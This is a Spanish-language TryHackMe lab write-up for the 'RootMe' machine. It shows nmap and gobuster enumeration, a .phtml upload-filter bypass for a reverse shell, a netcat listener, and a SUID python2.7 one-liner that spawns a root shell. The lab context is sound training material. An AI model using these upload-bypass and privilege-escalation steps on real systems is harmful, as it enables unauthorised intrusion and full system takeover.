# 🛠️ Writeup - RootMe

## 📌 Información General

- Plataforma: TryHackMe  
- Dificultad: Easy  
- IP: 10.128.162.85  
- Objetivo: Obtener acceso inicial al sistema y escalar privilegios hasta root  

---

## 🔍 Enumeración

### Escaneo con Nmap

Se realiza un escaneo con nmap para identificar los servicios expuestos en la máquina:

nmap -sC -sV -oN rootme.txt 10.128.162.85

Se detecta un servidor web en el puerto 80, lo que indica un posible vector de entrada.

---

## 🌐 Enumeración Web

Se utiliza gobuster para encontrar rutas ocultas en el servidor web:

gobuster dir -u http://10.128.162.85 -w /usr/share/wordlists/dirb/common.txt

Se encuentra la ruta /panel/, lo que indica posible funcionalidad interesante.

---

## 💥 Explotación

Se accede a /panel/ y se detecta una subida de archivos.

Tras varias pruebas, se observa que permite subir archivos .phtml, lo que permite ejecutar código en el servidor.

Se sube una reverse shell.

---

## 🐚 Reverse Shell

Se accede a /uploads/ y se ejecuta la shell mientras se pone en escucha:

nc -lvnp 4444

Se obtiene acceso inicial.

---

## 🔎 Post-explotación

Se comprueba el usuario con whoami y se mejora la shell:

python3 -c 'import pty; pty.spawn("/bin/bash")'

Se encuentra la user flag en /var/www/user.txt.

---

## 🔐 Escalada de Privilegios

Se ejecuta:

sudo -l

No hay acceso, por lo que se buscan SUID:

find / -perm -4000 -type f 2>/dev/null

Se detecta python2.7 con SUID.

Se ejecuta:

python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Se obtiene root.

---

## 🎯 Flags

- User: /var/www/user.txt  
- Root: /root/root.txt  

---

## 🧠 Lecciones Aprendidas

- Importancia de la enumeración
- Riesgos en subida de archivos
- Uso de SUID para escalada

---

## ✅ Conclusión

Enumeración → panel → subida → shell → SUID → root
